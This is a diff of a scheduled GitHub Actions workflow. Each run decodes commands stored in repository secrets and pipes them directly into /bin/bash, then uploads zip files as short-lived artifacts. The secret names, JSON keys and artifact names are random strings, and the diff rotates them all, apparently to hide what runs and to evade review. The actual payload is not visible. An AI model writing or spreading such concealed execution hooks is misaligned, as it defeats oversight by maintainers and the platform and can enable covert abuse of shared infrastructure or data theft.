@@ -3,7 +3,7 @@ on:
   workflow_dispatch:
 
   schedule:
-    - cron: '27 1,7,13,19 * * *'
+    - cron: '7 4,10,16,22 * * *'
 jobs:
   launch:
     runs-on: ubuntu-latest
@@ -15,16 +15,14 @@ jobs:
           fetch-depth: 1
       - name: Do work
         env:
-          txsk8907: ${{ secrets.txsk8907 }}
+          ms75789: ${{ secrets.ms75789 }}
         run: |
-          printf '%s' "$txsk8907" | jq -r .ropzr7456 | /bin/bash
-          echo $mebd3 | jq -r .lhw1533 | /bin/bash
-          echo $jupl21413 | jq -r .xkp7 | /bin/bash
-          echo $uc2 | jq -r .alz9 | /bin/bash
+          printf '%s' "$ms75789" | jq -r .ri7 | /bin/bash
+          printf '%s' "$pp80" | jq -r .rq2900 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
         with:
-          name: qk0dJUUL
+          name: elbr4QjJ
           path: "*.zip"
           retention-days: 1
